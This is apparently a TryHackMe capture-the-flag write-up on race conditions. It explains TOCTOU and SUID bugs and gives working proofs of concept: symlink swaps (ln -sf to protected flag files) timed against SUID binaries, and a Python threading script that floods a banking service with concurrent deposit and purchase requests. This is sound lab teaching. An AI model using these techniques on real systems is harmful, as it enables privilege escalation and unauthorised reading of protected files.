# thm: Race Conditions Challenge

https://tryhackme.com/room/raceconditions

## Background

- **Race Condition**: A **race condition** is a bug where the result depends on timing: two actions use the same thing, and who happens first changes the outcome.

- **SUID**: In Linux, the **Set-User-ID (SUID)** permission bit allows a binary to execute with the privileges of its file owner rather than the user who runs it. When a file has the SUID bit set (e.g. `-rwsr-xr-x`), and the owner is root, it means that any user executing the program temporarily gains root privileges during its execution. Basically, it lets a binary run with its owner’s (root) privileges.

  This is often used for programs that need elevated privileges to perform specific system tasks (for example, `/usr/bin/passwd` must update `/etc/shadow` but can be run by normal users).

  However, if such a binary is not carefully designed, it can be exploited — especially when it trusts user-controlled inputs such as file paths or symlinks.

## Walk

**What is the flag for the /home/walk/flag binary?**

Lets talk a look at a file `anti_flag_reader.c`. It basically takes a file paht from the user (`argv[1]`) and checks whether the path contains the string "flag" or the file is symbolic link. If either `path_check` or `symlink_check` is non-zero (indicating that the path contains "flag" or the file is a symbolic link), it returns 1, indicating an error or refusal to proceed.

There is these lines of code:
```
puts("<Press Enter to continue>"); 
getchar();
```
After the pause, it opens the file and prints its contents.

The critical issue is there is a gap of time between validating the path and actually opening the file. This pattern is called a **TOCTOU (Time-Of-Check to Time-Of-Use)** vulnerability, which is a classic type of **race condition**.

While the program is blocked on getchar(), waiting for the user to press Enter, an attacker in another terminal can swap the previously checked file for a symlink that points to a sensitive target, such as /home/walk/flag. Since the binary already decided the original path was safe and not a symlink, it does not re-validate it before opening.

```
race@ip-10-64-179-224:/home/walk$ whoami
race
race@ip-10-64-179-224:/home/walk$ ls -la
total 44
drwxr-xr-x 2 walk walk  4096 Mar 27  2023 .
drwxr-xr-x 8 root root  4096 Nov 24 08:49 ..
-rw-r--r-- 1 walk walk   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 walk walk  3771 Jan  6  2022 .bashrc
-rw-r--r-- 1 walk walk   807 Jan  6  2022 .profile
-rwsr-sr-x 1 walk walk 16368 Mar 27  2023 anti_flag_reader
-rw-r--r-- 1 walk walk  1071 Mar 27  2023 anti_flag_reader.c
-rw------- 1 walk walk    41 Mar 27  2023 flag
```

This trick works because the vulnerable binary is **SUID**, so when it follows the symlink it reads /home/walk/flag with elevated (walk) permissions instead of race's permission.

### PoC 
```
race@ip-10-64-169-164:/home/walk$ tty
/dev/pts/0
race@ip-10-64-169-164:/home/walk$ ./anti_flag_reader ../race/file
Checking if 'flag' is in the provided file path...
Checking if the file is a symlink...
<Press Enter to continue>

This file can't possibly be the flag. I'll print it out for you:

THM{[REDACTED]}
```
```
race@ip-10-64-169-164:~$ tty
/dev/pts/1
race@ip-10-64-169-164:~$ ln -sf /home/walk/flag ./file
```
## Run

**What is the flag for the /home/run/flag binary?**

there is `check_security_contex` function in the `cat2` binary:

```
int check_security_contex(char *file_name) {

	int context_result;

	context_result = access(file_name, R_OK);
	usleep(500);

	return context_result;
}
```

There is an `access(file_name, R_OK)` function within which checks if the file is readable. But the problem is how the binary handles "read-only". It does not check whether the file is “read-only” in the sense of permissions; it simply checks whether the current user is allowed to successfully open the file in read-only mode.

Plus, the check is performed with `access()` before the file is opened, and there is a small delay `usleep(500)` between the check and the actual file read.
It is a **race condition** exploit, so user can run commands in parallel and quickly replace the actual file that this binary tries to cat. 

### PoC

```
race@ip-10-64-179-224:~$ touch file
race@ip-10-64-179-224:~$ ls -la
total 36
drwxr-xr-x 5 race race 4096 Nov 24 09:05 .
drwxr-xr-x 8 root root 4096 Nov 24 08:49 ..
-rw------- 1 race race   22 Jun  8  2023 .bash_history
-rw-r--r-- 1 race race  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 race race 3771 Jan  6  2022 .bashrc
drwx------ 3 race race 4096 Mar 27  2023 .cache
drwxrwxr-x 3 race race 4096 Mar 27  2023 .local
-rw-r--r-- 1 race race  807 Jan  6  2022 .profile
drwx------ 2 race race 4096 Mar 27  2023 .ssh
-rw-rw-r-- 1 race race    0 Nov 24 09:05 file
race@ip-10-64-179-224:~$ /home/run/cat2 file & ln -sf /home/run/flag file
[1] 1213
Welcome to cat2!
This program is a side project I've been working on to be a more secure version of the popular cat command
Unlike cat, the cat2 command performs additional checks on the user's security context
This allows the command to be security compliant even if executed with SUID permissions!

Checking the user's security context...
Context has been checked, proceeding!

The user has access, outputting file...

race@ip-10-64-179-224:~$ THM{[REDACTED]}

[1]+  Done                    /home/run/cat2 file
race@ip-10-64-179-224:~$ 
```

## Sprint

**What is the flag for the /home/sprint/flag binary?**

The bankingsystem service handles each client connection in a separate thread.
All threads share one global integer variable: `int money`. Because there is no synchronization (no mutex or lock), multiple threads can read and write `money` simultaneously.

At the end of every thread, the code resets it
```
usleep(1);
money = 0;
```

This creates a **race condition**, one thread may check `money >= 15000` to purchase flag while another is still depositing it.

By sending many concurrent deposit and purchase flag requests, it possibly trigger a timing window where the condition is true before it’s reset, allowing the program to send `/home/sprint/flag` even though a single user shouldn’t have enough balance.

attacker.py:
```
$ cat attacker.py 
#!/bin/python3

import socket
import threading

IP = "10.65.139.68"
PORT = 1337

def send_request(command: str):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
        s.sendall(command.encode())
        resp = s.recv(1024)
        print(resp.decode(), end="")
        s.close()
    except Exception as e:
        print(f"Error: {e}")

def run():
    threads = []
    for _ in range(50):
        t1 = threading.Thread(target=send_request, args=("deposit\n",))
        t2 = threading.Thread(target=send_request, args=("purchase flag\n",))
        threads.append(t1)
        threads.append(t2)
        t1.start()
        t2.start()

    # Wait for all threads to finish
    for t in threads:
        t.join()

if __name__ == "__main__":
    run()

```

### PoC

```
race@ip-10-65-139-68:/home/sprint$ ./bankingsystem 
Listening for connections on port 1337...
Accepted commands: "deposit", "withdraw", "purchase flag"
Connection received! Creating a new handler thread...
Connection received! Creating a new handler thread...
Connection received! Creating a new handler thread...
Connection received! Creating a new handler thread...
Connection received! Creating a new handler thread...
Connection received! Creating a new handler thread...
```

```
$ python3 attacker.py 
Current balance: 10000
Current balance: 20000
Sorry, you don't have enough money to purchase the flag
Sorry, you don't have enough money to purchase the flag
Current balance: 10000
Current balance: 20000
Sorry, you don't have enough money to purchase the flag
Sorry, you don't have enough money to purchase the flag
Sorry, you don't have enough money to purchase the flag
Sorry, you don't have enough money to purchase the flag
Sorry, you don't have enough money to purchase the flag
Current balance: 10000
Sorry, you don't have enough money to purchase the flag
Current balance: 10000
Current balance: 10000
Sorry, you don't have enough money to purchase the flag
Current balance: 10000
Sorry, you don't have enough money to purchase the flag
Sorry, you don't have enough money to purchase the flag
Current balance: 10000
Sorry, you don't have enough money to purchase the flag
Sorry, you don't have enough money to purchase the flag
Current balance: 10000
Current balance: 20000
Current balance: 30000
Current balance: 10000
Current balance: 20000
Sorry, you don't have enough money to purchase the flag
THM{[REDACTED]}
```
